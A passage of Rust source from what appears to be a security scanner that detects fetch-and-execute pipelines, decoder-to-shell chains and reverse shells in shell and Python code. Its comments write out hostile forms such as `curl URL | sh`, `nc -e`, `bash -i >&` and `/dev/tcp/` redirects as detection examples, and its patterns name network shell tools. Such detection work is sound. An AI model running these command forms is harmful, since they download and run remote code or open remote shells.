        return StdinBehavior::Consumes; // read, but emitted elsewhere
    }
    if forwards_stdin_body(command) {
        StdinBehavior::Forwards
    } else {
        StdinBehavior::Consumes // the pipe drains into derived output
    }
}

/// Whether the piped data reaches an interpreter when this segment runs:
/// a plain command inherits the pipe, a compound group's statements run in
/// order under the stdin model. A consumer counts when it will actually
/// execute stdin as code — a stdin-script interpreter, an interpreter
/// whose static `-c` body consumes it (`sh -c sh`), an explicit
/// stdin-to-code consumer (`source /dev/stdin`, `xargs sh -c`), or a
/// substitution that turns the pipe into executed text (`eval "$(cat)"`).
fn segment_reaches_interpreter(segment: &[ShellToken], budget: &mut ShellBudget) -> bool {
    match compound_position(segment) {
        Some((GroupKind::List, group)) => group_stdin_reaches_interpreter(group, budget).0,
        Some((GroupKind::Arithmetic, _)) => false,
        None => {
            segment_commands(segment)
                .iter()
                .any(|command| command_consumes_stdin_code(command, budget))
                || segment_consumes_stdin_substitution(segment, budget)
        }
    }
}

/// Tracks the piped body through a compound consumer group's statements:
/// returns whether an interpreter received it, and whether the group
/// exhausted the pipe for whoever runs after it (`(cat | sh)` both feeds
/// its interpreter and empties the pipe; `(echo x; sh)` leaves nothing for
/// later statements but only because sh ran them). Conditional lists keep
/// their short-circuit semantics: `false && cat >/dev/null` never runs, so
/// the body survives for the next statement.
fn group_stdin_reaches_interpreter(group: &[ShellToken], budget: &mut ShellBudget) -> (bool, bool) {
    if !budget.spend(group.len()) || !budget.enter() {
        return (false, false);
    }
    let mut pipe_alive = true;
    let mut reached = false;
    let mut drained = false;
    let mut outcomes = Outcomes::ANY;
    for (statement, guard) in conditional_statements(group) {
        if statement.is_empty() {
            continue;
        }
        if !outcomes.executes(guard) {
            continue; // short-circuited: the pipe is untouched by it
        }
        let segments = pipeline_segments(statement);
        if !segments.is_empty() {
            let behaviors: Vec<StdinBehavior> = segments
                .iter()
                .map(|segment| segment_stdin_behavior(segment, budget))
                .collect();
            let mut data = pipe_alive;
            for (index, segment) in segments.iter().enumerate() {
                if data {
                    reached |= segment_reaches_interpreter(segment, budget);
                }
                if index + 1 < segments.len() {
                    data &= behaviors[index] == StdinBehavior::Forwards;
                }
            }
            // The group's pipe survives the statement only if its leading
            // command never read it.
            if pipe_alive && behaviors[0] != StdinBehavior::Untouched {
                pipe_alive = false;
                drained = true;
            }
        }
        outcomes = outcomes.advance(guard, statement_outcomes(statement));
    }
    budget.leave();
    (reached, drained)
}

/// Whether a compound INTERMEDIATE pipeline stage passes the piped body
/// through to its stdout: some statement must read the live pipe and emit
/// it unredirected (`(cat)` forwards, `(cat >/dev/null)` and `(sh)` spend
/// it, `(echo x)` never touches it and the body stops there).
fn group_forwards_stdin(group: &[ShellToken], budget: &mut ShellBudget) -> bool {
    if !budget.spend(group.len()) || !budget.enter() {
        return false;
    }
    let mut pipe_alive = true;
    let mut forwards = false;
    let mut outcomes = Outcomes::ANY;
    for (statement, guard) in conditional_statements(group) {
        if statement.is_empty() {
            continue;
        }
        if !outcomes.executes(guard) {
            continue;
        }
        let segments = pipeline_segments(statement);
        if !segments.is_empty() {
            let behaviors: Vec<StdinBehavior> = segments
                .iter()
                .map(|segment| segment_stdin_behavior(segment, budget))
                .collect();
            // The body flows stage to stage only through forwarding
            // commands; walking off the pipeline's end with it still in
            // hand means it left through the compound's stdout.
            let mut data = pipe_alive;
            for behavior in &behaviors {
                if *behavior != StdinBehavior::Forwards {
                    data = false;
                    break;
                }
            }
            if data {
                forwards = true;
            }
            if pipe_alive && behaviors[0] != StdinBehavior::Untouched {
                pipe_alive = false;
            }
        }
        outcomes = outcomes.advance(guard, statement_outcomes(statement));
        if forwards {
            break;
        }
    }
    budget.leave();
    forwards
}

/// Whether the pipeline's stdin still reaches an interpreter when the
/// consumer segment runs. The compound's own stdin redirection (`( … ) <
/// /dev/null`) starves everything inside; otherwise the consumer is walked
/// with the stdin model, so a preceding `cat` that drains the body keeps
/// `curl URL | (cat >/dev/null; sh)` silent while `(echo x; sh)` and
/// `(cat | sh)` still fire.
fn segment_stdin_reaches_interpreter(segment: &[ShellToken], budget: &mut ShellBudget) -> bool {
    if depth_zero_redirect_moves_stdin_away(segment) {
        return false;
    }
    segment_reaches_interpreter(segment, budget)
}

/// Whether a redirection operator (with its target word) moves fd 1 off the
/// pipeline. The affected descriptor is the explicit fd digits, else 1 for
/// `>` forms and 0 for `<` forms; `&>` moves both streams; a duplication
/// (`>&m`) keeps stdout only when duplicated onto itself.
fn redirect_moves_stdout_away(op: &str, target: &str) -> bool {
    let digits_end = op.bytes().take_while(u8::is_ascii_digit).count();
    let rest = &op[digits_end..];
    if rest == "&>" || rest == "&>>" {
        return true; // both stdout and stderr redirected
    }
    let default_fd = if rest.starts_with('>') { 1 } else { 0 };
    let fd = op[..digits_end].parse::<u32>().unwrap_or(default_fd);
    if fd != 1 {
        return false; // stderr-only (or other) redirects keep the pipe fed
    }
    match rest {
        ">&" | "<&" => target != "1", // duplication stays only onto itself
        _ => true,                    // >, >>, <, <>, << on fd 1 all leave the pipe
    }
}

/// Any I/O redirection operator in the segment.
fn segment_has_redirect_op(segment: &[ShellToken]) -> bool {
    segment
        .iter()
        .filter_map(ShellToken::operator)
        .any(is_redirect_operator)
}

/// Whether stdout still reaches `consumer` from `producer` along the
/// pipeline: the producer's OWN stdout is judged per command site
/// (segment_has_live_producer); every segment BETWEEN the two must pass the
/// body through.
fn stdout_reaches(
    segments: &[&[ShellToken]],
    producer: usize,
    consumer: usize,
    budget: &mut ShellBudget,
) -> bool {
    segments[producer + 1..consumer]
        .iter()
        .all(|segment| segment_stdout_preserved(segment, budget))
}

/// Redirect operators at the segment's own nesting depth: redirects inside
/// compound groups belong to the inner commands that carry them, while
/// depth-zero redirects belong to the (possibly compound) command itself.
fn depth_zero_redirect(segment: &[ShellToken], mut moves: impl FnMut(&str, &str) -> bool) -> bool {
    let mut depth = 0i32;
    let mut index = 0usize;
    while index < segment.len() {
        if let Some(op) = segment[index].operator() {
            match op {
                "(" | "{" | "((" => depth += 1,
                ")" | "}" | "))" => depth = (depth - 1).max(0),
                _ if depth == 0 && is_redirect_operator(op) => {
                    let target = segment
                        .get(index + 1)
                        .and_then(ShellToken::word)
                        .unwrap_or("");
                    if moves(op, target) {
                        return true;
                    }
                }
                _ => {}
            }
        }
        index += 1;
    }
    false
}

fn depth_zero_redirect_moves_stdout(segment: &[ShellToken]) -> bool {
    depth_zero_redirect(segment, redirect_moves_stdout_away)
}

fn depth_zero_redirect_moves_stdin_away(segment: &[ShellToken]) -> bool {
    depth_zero_redirect(segment, redirect_moves_stdin_away)
}

/// Whether a redirection operator (with its target word) replaces the
/// compound's stdin: fd 0 moved anywhere except back onto itself
/// (`<file`, `0</dev/null`, `<<EOF`, `<&-` starve everything inside;
/// `2<&1` and `0<&0` do not touch stdin).
fn redirect_moves_stdin_away(op: &str, target: &str) -> bool {
    let digits_end = op.bytes().take_while(u8::is_ascii_digit).count();
    let rest = &op[digits_end..];
    let default_fd = if rest.starts_with('<') { 0 } else { 1 };
    let fd = op[..digits_end].parse::<u32>().unwrap_or(default_fd);
    if fd != 0 {
        return false;
    }
    match rest {
        "<&" | ">&" => target != "0", // duplication stays only onto itself
        _ => true,                    // <, <<, <> on fd 0 all replace stdin
    }
}

/// The compound group opening at the segment's command position (after the
/// usual prefixes), with its interior: `None` when the segment heads a plain
/// command.
fn compound_position(segment: &[ShellToken]) -> Option<(GroupKind, &[ShellToken])> {
    let mut index = 0usize;
    while let Some(token) = segment.get(index) {
        match token {
            ShellToken::Operator(op) => {
                let op = op.as_str();
                if op == "(" || op == "{" || op == "((" {
                    let kind = if op == "((" {
                        GroupKind::Arithmetic
                    } else {
                        GroupKind::List
                    };
                    let close = matching_group_close(segment, index)?;
                    return Some((kind, &segment[index + 1..close]));
                } else if is_redirect_operator(op) {
                    index += 1;
                    if matches!(segment.get(index), Some(ShellToken::Word { .. })) {
                        index += 1; // the redirect target word
                    }
                } else {
                    return None;
                }
            }
            ShellToken::Word { value, .. } if value == "!" || is_env_assignment(value) => {
                index += 1;
            }
            _ => return None,
        }
    }
    None
}

/// Whether the segment holds a fetch/decoder command whose stdout still
/// lands on the shared fd 1 — the pipe — provenance tracked PER COMMAND
/// rather than one compound-wide boolean: a compound's depth-zero redirect
/// starves every site inside it (`( … ) > body`), each inner command's own
/// redirect starves only that command (`(curl URL >/tmp/body; echo safe)`
/// emits nothing from the fetch, while `(curl URL; echo safe >/tmp/log)`
/// already wrote the body into the pipe), short-circuited statements
/// own no live sites at all, and a site's own pipeline must carry its
/// output to the compound's stdout (`(curl URL | cat >/dev/null)`)
/// contributes nothing.
fn segment_has_live_producer(
    segment: &[ShellToken],
    budget: &mut ShellBudget,
    pred: &impl Fn(&ScriptCommand) -> bool,
) -> bool {
    if depth_zero_redirect_moves_stdout(segment) {
        return false;
    }
    match compound_position(segment) {
        Some((GroupKind::List, group)) => {
            if !budget.spend(group.len()) || !budget.enter() {
                return false;
            }
            let mut outcomes = Outcomes::ANY;
            let mut found = false;
            for (statement, guard) in conditional_statements(group) {
                if statement.is_empty() {
                    continue;
                }
                if !outcomes.executes(guard) {
                    continue;
                }
                if pipeline_has_live_producer(&pipeline_segments(statement), budget, pred) {
                    found = true;
                    break;
                }
                outcomes = outcomes.advance(guard, statement_outcomes(statement));
            }
            budget.leave();
            found
        }
        // Arithmetic evaluates; it emits no command output.
        Some((GroupKind::Arithmetic, _)) => false,
        None => segment_commands(segment)
            .iter()
            .any(|command| pred(command) || command_body_produces_fetch_output(command, budget)),
    }
}

/// Whether a command's statically known body produces fetch output on its
/// own stdout — `sh -c 'curl URL' | sh` runs the response downstream,
/// while `sh -c 'curl URL | sh'` leaves only the inner script's output.
fn command_body_produces_fetch_output(command: &ScriptCommand, budget: &mut ShellBudget) -> bool {
    let Some(body) = static_command_body(command) else {
        return false;
    };
    if !budget.enter() {
        return false;
    }
    let found = tokens_live_fetch_stdout(&tokenize(&body), budget);
    budget.leave();
    found
}

/// Whether any pipeline segment is a live producer whose stdout also flows
/// through the REST of its own pipeline — the boundary between the site and
/// the enclosing context (a compound's stdout, or a substitution's
/// collected output): `(curl URL | cat >/dev/null)` and
/// `eval "$(curl URL | cat >/dev/null)"` contribute nothing because `cat`
/// spends the body before the pipeline ends.
fn pipeline_has_live_producer(
    segments: &[&[ShellToken]],
    budget: &mut ShellBudget,
    pred: &impl Fn(&ScriptCommand) -> bool,
) -> bool {
    segments.iter().enumerate().any(|(site, segment)| {
        segment_has_live_producer(segment, budget, pred)
            && stdout_reaches(segments, site, segments.len(), budget)
    })
}

/// Whether an INTERMEDIATE pipeline segment passes the piped body through
/// to the next one. Plain stages forward only when their leading command is
/// a KNOWN stdin transformer (`cat`, `sed`, `xxd -r`) — `echo safe` and
/// every other non-reading command leave the pipe untouched, so the body
/// stops there. A compound forwards only when one of its statements reads
/// the live pipe and emits it unredirected.
fn segment_stdout_preserved(segment: &[ShellToken], budget: &mut ShellBudget) -> bool {
    if depth_zero_redirect_moves_stdout(segment) {
        return false;
    }
    match compound_position(segment) {
        Some((GroupKind::List, group)) => group_forwards_stdin(group, budget),
        // Arithmetic never reads its stdin: the body stops there.
        Some((GroupKind::Arithmetic, _)) => false,
        // A plain stage forwards only when its leading command is a KNOWN
        // stdin transformer (the same model that reads compound interiors):
        // `echo safe` leaves the pipe untouched, `cat >/dev/null` spends it,
        // and only a forwarding filter passes the body on.
        None => segment_stdin_behavior(segment, budget) == StdinBehavior::Forwards,
    }
}

/// A fetch-tool command whose output reaches an interpreter down the same
/// pipeline: `curl … | sh`, `curl x | gzip -d | sh`, including from inside a
/// producing compound group (`(echo x; curl URL) | sh`). The fetch site's
/// own stdout must land on the pipe and the body must survive every
/// intermediate segment.
fn pipeline_fetches_to_interpreter(statement: &[ShellToken], budget: &mut ShellBudget) -> bool {
    let segments = pipeline_segments(statement);
    for consumer in 1..segments.len() {
        if !segment_stdin_reaches_interpreter(segments[consumer], budget) {
            continue;
        }
        for producer in 0..consumer {
            if segment_has_live_producer(segments[producer], budget, &command_fetches)
                && stdout_reaches(&segments, producer, consumer, budget)
            {
                return true;
            }
        }
    }
    false
}

/// A decoder command feeding an interpreter through the pipe: `… | base64 -d
/// | sh`, `curl x | xxd -r | zsh`, including across intermediate segments,
/// with the decoder's own stdout tracked per command site.
fn pipeline_decodes_to_interpreter(statement: &[ShellToken], budget: &mut ShellBudget) -> bool {
    let segments = pipeline_segments(statement);
    for consumer in 1..segments.len() {
        if !segment_stdin_reaches_interpreter(segments[consumer], budget) {
            continue;
        }
        for producer in 0..consumer {
            if segment_has_live_producer(segments[producer], budget, &command_decodes)
                && stdout_reaches(&segments, producer, consumer, budget)
            {
                return true;
            }
        }
    }
    false
}

/// A fetch tool in command position anywhere the script actually runs —
/// across executed statements and pipeline segments (including inside
/// compound groups, whose own statements keep their guards), and
/// recursively inside every active command or process substitution, so
/// `payload="$(curl …)"` and `(echo x; curl URL) | sh` attribute egress
/// while `echo curl …`, single-quoted prose, and short-circuited branches
/// (`false && curl URL`) do not.
fn tokens_fetch_egress(tokens: &[ShellToken], budget: &mut ShellBudget) -> bool {
    if !budget.spend(tokens.len()) {
        return false;
    }
    executed_list_fetch_egress(tokens, budget)
}

/// The conditional statement walk for egress: a statement is scanned only
/// when some execution path reaches it, and a list group's interior is just
/// another such list — guards are kept at EVERY nesting level, so a
/// short-circuited branch contributes neither commands nor substitutions.
fn executed_list_fetch_egress(tokens: &[ShellToken], budget: &mut ShellBudget) -> bool {
    let mut outcomes = Outcomes::ANY;
    for (statement, guard) in conditional_statements(tokens) {
        if statement.is_empty() {
            continue;
        }
        if !outcomes.executes(guard) {
            continue; // no path reaches it; the outcome set is unchanged
        }
        if executed_statement_fetch_egress(statement, budget) {
            return true;
        }
        outcomes = outcomes.advance(guard, statement_outcomes(statement));
    }
    false
}

/// One ALREADY-EXECUTED statement: fetch commands in command position
/// anywhere in its pipeline segments — group interiors recurse through
/// their own guarded walk — fetch substitutions in the segment's own
/// words, and fetches inside statically known interpreter bodies and
/// `eval` arguments (`sh -c 'curl URL'` runs the fetch with the
/// statement).
fn executed_statement_fetch_egress(statement: &[ShellToken], budget: &mut ShellBudget) -> bool {
    pipeline_segments(statement).iter().any(|segment| {
        segment_fetches(segment, budget)
            || segment_substitution_egress(segment, budget)
            || segment_body_fetch_egress(segment, budget)
    })
}

/// Egress from the statically known shell text a segment's commands
/// execute: an interpreter's `-c` body or an `eval` argument list.
fn segment_body_fetch_egress(segment: &[ShellToken], budget: &mut ShellBudget) -> bool {
    segment_commands(segment).iter().any(|command| {
        let Some(body) = static_command_body(command) else {
            return false;
        };
        if !budget.enter() {
            return false;
        }
        let found = tokens_fetch_egress(&tokenize(&body), budget);
        budget.leave();
        found
    })
}

/// Egress from a segment's substitutions: depth-0 words run their command
/// and process substitutions, a nested list group's interior goes through
/// the guarded statement walk (words inside it belong to that walk), and an
/// arithmetic group evaluates wholly — every substitution inside it runs.
fn segment_substitution_egress(segment: &[ShellToken], budget: &mut ShellBudget) -> bool {
    let mut index = 0usize;
    while index < segment.len() {
        match &segment[index] {
            ShellToken::Word { substitutions, .. } => {
                if substitutions_fetch_egress(substitutions, budget) {
                    return true;
                }
                index += 1;
            }
            ShellToken::Operator(op) if op == "(" || op == "{" || op == "((" => {
                let arithmetic = op == "((";
                let Some(close) = matching_group_close(segment, index) else {
                    index += 1;
                    continue;
                };
                let interior = &segment[index + 1..close];
                let found = if arithmetic {
                    interior.iter().any(|token| {
                        matches!(token, ShellToken::Word { substitutions, .. }
                            if substitutions_fetch_egress(substitutions, budget))
                    })
                } else if budget.spend(interior.len()) && budget.enter() {
                    let found = executed_list_fetch_egress(interior, budget);
                    budget.leave();
                    found
                } else {
                    false
                };
                if found {
                    return true;
                }
                index = close + 1;
            }
            ShellToken::Operator(_) => index += 1,
        }
    }
    false
}

/// Egress from one word's substitutions: command and process substitutions
/// run their interior as script text (bounded by the depth budget — the
/// recursion shape is the same as the groups'), while an arithmetic
/// expansion only evaluates variables.
fn substitutions_fetch_egress(substitutions: &[Substitution], budget: &mut ShellBudget) -> bool {
    substitutions
        .iter()
        .any(|substitution| match substitution.kind {
            SubstKind::Command | SubstKind::Process => {
                if !budget.enter() {
                    return false;
                }
                let found = tokens_fetch_egress(&tokenize(&substitution.inner), budget);
                budget.leave();
                found
            }
            SubstKind::Arithmetic => arithmetic_fetch_egress(&substitution.inner, budget),
        })
}

/// Only the genuine substitutions nested inside an arithmetic expression run
/// commands (`$(( $(curl x) + 1 ))` fetches); the expression's own words are
/// variable references, so `$((curl))` names a variable, never a command.
fn arithmetic_fetch_egress(expression: &str, budget: &mut ShellBudget) -> bool {
    if !budget.spend(expression.len()) || !budget.enter() {
        return false;
    }
    let found = tokenize(expression).iter().any(|token| match token {
        ShellToken::Word { substitutions, .. } => substitutions_fetch_egress(substitutions, budget),
        ShellToken::Operator(_) => false,
    });
    budget.leave();
    found
}

/// Command-position fetch check for an interpreter `-c` body and other
/// re-parsed script text (`cd /tmp; curl … | sh` fetches, `echo curl failed`
/// does not). Returns whether the body fetches and whether the body's fresh
/// budget was exhausted (unverified depth), so callers can disclose the
/// coverage limitation.
fn script_body_fetches(script: &str) -> (bool, bool) {
    let mut budget = ShellBudget::new();
    let fetches = tokens_fetch_egress(&tokenize(script), &mut budget);
    (fetches, budget.exhausted())
}

/// Record the analysis-budget coverage limitation once per file.
fn disclose_budget_limitation(outcome: &mut FileOutcome) {
    let limitation = "shell-analysis-budget-exhausted";
    if !outcome
        .limitations
        .iter()
        .any(|existing| existing == limitation)
    {
        outcome.limitations.push(limitation.to_owned());
    }
}

/// Runtime interiors of the substitutions this statement's live heads
/// execute: an `eval` in command position runs its command substitutions'
/// text, and an interpreter/`source`/`.` head runs its process substitutions
/// as script input. `diff <(curl a)` compares and `echo eval "$(curl …)"`
/// never executes, so neither yields a consumed span.
fn consumed_substitutions(statement: &[ShellToken]) -> Vec<String> {
    let mut spans = Vec::new();
    for segment in pipeline_segments(statement) {
        let commands = segment_commands(segment);
        let head_eval = commands.iter().any(|command| command.head == "eval");
        let head_consumes = commands.iter().any(|command| {
            INTERPRETER_BASENAMES.contains(&command.head) || command.head == "source"
        }) || segment_head_word(segment) == Some(".");
        for token in segment {
            if let ShellToken::Word { substitutions, .. } = token {
                for substitution in substitutions {
                    let executed = match substitution.kind {
                        SubstKind::Command => head_eval,
                        SubstKind::Process => head_consumes,
                        // Arithmetic evaluates to a number; `eval 0` runs no
                        // fetched text.
                        SubstKind::Arithmetic => false,
                    };
                    if executed {
                        spans.push(substitution.inner.clone());
                    }
                }
            }
        }
    }
    spans
}

/// The head word value of a segment before basename reduction, so a bare `.`
/// source is recognisable (`command_basename(".")` is empty).
fn segment_head_word(segment: &[ShellToken]) -> Option<&str> {
    let mut index = 0usize;
    skip_command_prefixes(segment, &mut index);
    segment.get(index).and_then(ShellToken::word)
}

/// A fetch-tool command inside an executed substitution span: a LIVE
/// producer site in command position whose output survives the rest of its
/// own pipeline to become the span's collected output (including compound
/// groups), its own stdout tracked per command. `eval "$(curl x > f)"`
/// writes the response to a file and executes nothing, and
/// `eval "$(curl x | cat >/dev/null)"` collects only what `cat` leaves —
/// nothing; `eval "$(false && curl x)"` never runs the fetch.
fn span_has_fetch_command(span: &str, budget: &mut ShellBudget) -> bool {
    tokens_live_fetch_stdout(&tokenize(span), budget)
}

/// A decoder command inside an executed substitution span: feeding an
/// interpreter within the span, or a live decoder site heading it.
fn span_executes_decoder(span: &str, budget: &mut ShellBudget) -> bool {
    let tokens = tokenize(span);
    let mut outcomes = Outcomes::ANY;
    for (statement, guard) in conditional_statements(&tokens) {
        if statement.is_empty() {
            continue;
        }
        if !outcomes.executes(guard) {
            continue;
        }
        if pipeline_decodes_to_interpreter(statement, budget)
            || pipeline_has_live_producer(&pipeline_segments(statement), budget, &command_decodes)
        {
            return true;
        }
        outcomes = outcomes.advance(guard, statement_outcomes(statement));
    }
    false
}

/// Interpreter basenames that consume piped/substituted content, shared by
/// the pipe, process-substitution, and decode-execute consumers.
const INTERPRETER_BASENAMES: [&str; 8] = [
    "sh", "bash", "dash", "zsh", "ksh", "ash", "python", "python3",
];

/// Basename of a command token, tolerating prefixed punctuation left in a
/// value by a substitution head (`$(curl`, `/usr/bin/nc`).
fn command_basename(token: &str) -> &str {
    let trimmed = token.trim_start_matches(|character: char| !character.is_ascii_alphanumeric());
    trimmed.rsplit('/').next().unwrap_or(trimmed)
}

/// High-signal interactive-shell spellings bound to command positions in one
/// pipeline segment: `nc`/`ncat`/`netcat` owning an `-e`/`-le` flag, `socat`
/// owning an `exec:` operand, `bash -i` owning a descriptor-duplication
/// redirect (`>&`, the remote-transport wiring — a plain `>` is a local log
/// file), and a `/dev/tcp/` target behind a redirect on an interpreter or
/// `exec` command. Quoted or echoed mentions are prose — the `/dev/tcp/`
/// needle is read from token values, but the command head gates every branch.
fn reverse_shell_spelling(segment: &[ShellToken]) -> bool {
    let dev_tcp = segment
        .iter()
        .filter_map(ShellToken::word)
        .any(|word| word.contains("/dev/tcp/"));
    let redirect_op = segment_has_redirect_op(segment);
    let dup_redirect = segment.iter().filter_map(ShellToken::operator).any(|op| {
        let digits = op.bytes().take_while(u8::is_ascii_digit).count();
        &op[digits..] == ">&"
    });
    for command in segment_commands(segment) {
        match command.head {
            "nc" | "ncat" | "netcat"
                if command.args.iter().any(|arg| matches!(*arg, "-e" | "-le")) =>
            {
                return true;
            }
            "socat" if command.args.iter().any(|arg| lower_contains(arg, "exec:")) => {
                return true;
            }
            "bash" if command.args.contains(&"-i") && dup_redirect => {
                return true;
            }
            _ => {}
        }
        if dev_tcp
            && redirect_op
            && (INTERPRETER_BASENAMES.contains(&command.head) || command.head == "exec")
        {
            return true;
        }
    }
    false
}

/// Whether any command's own arguments name a shared temporary location.
/// Read from each command's real argument values — redirect operands
/// excluded — so a log target (`sudo /usr/bin/true > /tmp/sudo.log`) never
/// associates a path with a command that never touched one, while a quoted
/// operand (`chmod 777 "/tmp/x"`) still binds.
fn segment_has_shared_temp_path(segment: &[ShellToken]) -> bool {
    segment_commands(segment).iter().any(|command| {
        command
            .args
            .iter()
            .any(|arg| arg.contains("/tmp/") || arg.contains("/dev/shm"))
    })
}

/// Group/other-writable mode operand for `chmod`: octal with write bits for
/// group or others (`666`, `0777`, `1777`), or a symbolic `+w`/`=w` spelling
/// whose who-list includes group, other, or all (`a+w`, `go+w`, `o=w`).
/// Owner-only grants (`u+w`, `644`, `700`) are not a release.
fn writable_shared_temp_mode(token: &str) -> bool {
    let digits = token.trim_start_matches('0');
    if !digits.is_empty()
        && digits.bytes().all(|byte| (b'0'..=b'7').contains(&byte))
        && let Ok(mode) = u32::from_str_radix(digits, 8)
    {
        return mode & 0o022 != 0;
    }
    for suffix in ["+w", "=w"] {
        if let Some(who) = token.strip_suffix(suffix) {
            return who.is_empty() || who.bytes().any(|byte| matches!(byte, b'a' | b'g' | b'o'));
        }
    }
    false
}

/// A `chmod` command in command position whose own arguments release a
/// group/other-writable mode. The shared-temp path is bound to the same
/// segment by the caller; the connected untrusted-write predicate belongs to
/// the H4 dataflow slice.
fn chmod_relaxes_shared_temp(segment: &[ShellToken]) -> bool {
    segment_commands(segment).iter().any(|command| {
        command.head == "chmod"
            && command
                .args
                .iter()
                .any(|arg| writable_shared_temp_mode(arg))
    })
}

/// Python reverse shell (H3 review): a connected socket whose descriptor
/// reaches a process — a `dup2(` or `Popen(` call whose own argument span
/// passes that socket's `fileno()` (or chains
/// `create_connection( … ).fileno()` inline). Independent socket and
/// dup2 words never fire: `s = socket.create_connection((host, 443));
/// os.dup2(1, 2)` and `s.connect(…); os.dup2(log.fileno(), 1)` stay
/// silent.
fn python_reverse_shell(code: &str) -> bool {
    let mut sockets = Vec::new();
    for (index, _) in code.match_indices(".connect(") {
        if let Some(receiver) = dotted_identifier_before(code, index) {
            sockets.push(receiver);
        }
    }
    for (index, _) in code.match_indices("create_connection(") {
        if let Some(target) = assigned_name_before(code, index) {
            sockets.push(target);
        }
    }
    for call in ["dup2(", "Popen("] {
        for (index, _) in code.match_indices(call) {
            let Some((open, close)) = balanced_bracket_span(code, index + call.len() - 1) else {
                continue;
            };
            let args = &code[open..close];
            let wired = sockets
                .iter()
                .any(|socket| args.contains(&format!("{socket}.fileno()")))
                || (args.contains("fileno()") && args.contains("create_connection("));
            if wired {
                return true;
            }
        }
    }
    false
}

/// Receiver chain of a `.connect(` call: the dotted identifier before the
/// dot (`s`, `self.sock`).
fn dotted_identifier_before(code: &str, dot_index: usize) -> Option<&str> {
    let bytes = code.as_bytes();
    let mut start = dot_index;
    while start > 0
        && (bytes[start - 1].is_ascii_alphanumeric()
            || bytes[start - 1] == b'_'
            || bytes[start - 1] == b'.')
    {
        start -= 1;
    }
    let name = &code[start..dot_index];
    (!name.is_empty()).then_some(name)
}

/// Assignment target feeding a `create_connection(` call: the assignment
/// operator must live in the SAME statement as the call —
/// `s = socket.create_connection(…)` (or `s = wrapper(…)` wrapping it).
/// A `=` left over from an earlier statement (`log = open(…);
/// socket.create_connection(…); os.dup2(log.fileno(), 1)`) binds nothing,
/// and comparison operators (`==`, `<=`, `>=`, `!=`) are never
/// assignments.
fn assigned_name_before(code: &str, call_index: usize) -> Option<&str> {
    let before = &code[..call_index];
    let statement_start = before.rfind([';', '\n']).map_or(0, |index| index + 1);
    let statement = &before[statement_start..];
    let equals = statement.rfind('=')?;
    if statement[..equals].ends_with(['!', '<', '>', '=']) {
        return None; // ==, !=, <=, >= comparisons
    }
    let target = statement[..equals].trim_end();
    let start = target
        .char_indices()
        .rev()
        .take_while(|(_, character)| character.is_alphanumeric() || *character == '_')
        .last()
        .map(|(byte, _)| byte)?;
    let name = &target[start..];
    (!name.is_empty()).then_some(name)
}

/// Plugin manifests feed context-level results and capability context that
/// influence review priority without ever asserting malicious behavior.
fn apply_manifest_context(content: &[u8], relative_path: &str, artifacts: &mut AnalysisArtifacts) {
    let value = match serde_json::from_slice::<serde_json::Value>(content) {
        Ok(value) => value,
        Err(_) => {
            artifacts
                .limitations
                .push(format!("manifest-context-unreadable:{relative_path}"));
            return;
        }
    };
    // Both the installed layout (`plugins: [...]`) and single-plugin trees
    // (`kinds` at top level or under one plugin object) are accepted.
    let mut kinds_lists: Vec<serde_json::Value> = Vec::new();
    if let Some(plugins) = value.get("plugins").and_then(serde_json::Value::as_array) {
        for plugin in plugins {
            if let Some(kinds) = plugin.get("kinds") {
                kinds_lists.push(kinds.clone());
            }
        }
    } else if let Some(kinds) = value.get("kinds") {
        kinds_lists.push(kinds.clone());
    }
    let mut seen_bar = false;
    let mut seen_service = false;
    for kinds_value in &kinds_lists {
        let Some(kinds) = kinds_value.as_array() else {
            continue;
        };
        for kind in kinds.iter().filter_map(serde_json::Value::as_str) {
            match kind {
                "bar" => seen_bar = true,
                "service" => seen_service = true,
                _ => {}
            }
        }
    }
    if !seen_bar && !seen_service {
        return;
    }
    if seen_bar
        && let Ok(result) = NormalizedResult::new(
            REPLACES_BAR_RULE,
            relative_path,
            None,
            None,
            "replaces-bar-context",
            None,
        )
    {
        artifacts.results.push(result);
    }
    if seen_service {
        let mut occurrence = occurrence(
            Capability::PersistenceScheduling,
            Language::Context,
            1,
            "headless-service-kind",
        );
        occurrence.relative_path = relative_path.to_owned();
        artifacts.capabilities.push(occurrence);
    }
}

#[cfg(feature = "qml-parser")]
fn analyze_qml_source(source: &str) -> FileOutcome {
    match crate::qml::parse_qml(source.as_bytes()) {
        Some(tree) => ast_scan_qml(source, &tree),
        None => lexical_scan(source, Language::Qml),
    }
}

#[cfg(not(feature = "qml-parser"))]
fn analyze_qml_source(source: &str) -> FileOutcome {
    lexical_scan(source, Language::Qml)
}

// ---------------------------------------------------------------------------
// AST-backed QML analysis (qml-parser feature).
// ---------------------------------------------------------------------------

#[cfg(feature = "qml-parser")]
mod ast {
    use super::*;

    /// Classified value of a binding or call argument.
    enum Value {
        Static(String),
        Dynamic(&'static str),
    }

    pub(super) fn scan(source: &str, tree: &tree_sitter::Tree) -> FileOutcome {
        let mut outcome = FileOutcome {
            result_parts: Vec::new(),
            capabilities: Vec::new(),
            references: Vec::new(),
            parse_degraded: tree.root_node().has_error(),
            confidence: Confidence::AstBacked,
            limitations: Vec::new(),
        };
        let mut flags = LexFlags {
            detached_any: None,
            network: None,
        };

        let mut stack = vec![tree.root_node()];
        while let Some(node) = stack.pop() {
            let kind = node.kind();
            match kind {
                "ui_import" => {
                    let module = import_module_text(source, node);
                    if !module.is_empty() {
                        apply_import_surface(&module, number_of(node), &mut outcome);
                    }
                    // Directory imports spell the module as a string:
                    // `import "./dialogs" as D`.
                    let mut import_cursor = node.walk();
                    let import_children: Vec<tree_sitter::Node> =
                        node.children(&mut import_cursor).collect();
                    for child in import_children {
                        if child.kind() == "string" {
                            let specifier = string_literal_content(source, child);
                            if !specifier.is_empty() {
                                apply_directory_import(&specifier, number_of(node), &mut outcome);
                            }
                        }
                    }
                }
                "ui_object_definition" => {
                    handle_object_definition(source, node, &mut outcome);
                    // Loader { source: <expr> }: computed sources are
                    // dynamic reference sinks. Qualified spellings
                    // (`QQ.Loader`) resolve through the terminal type
                    // segment (H2 review).
                    let is_loader = object_type_node(source, node).is_some_and(|type_node| {
                        terminal_segment(node_text(source, type_node)) == "Loader"
                    });
                    if is_loader && binding_value_named(source, node, "source").is_some() {
                        let binding = binding_value_named(source, node, "source").unwrap();
                        {
                            match classify_value(source, binding) {
                                Value::Static(text) => {
                                    record_sink_reference(
                                        &text,
                                        SinkPosition::LoaderSource,
                                        number_of(binding),
                                        &mut outcome,
                                    );
                                }
                                Value::Dynamic(_) => {
                                    outcome.result_parts.push(parts(
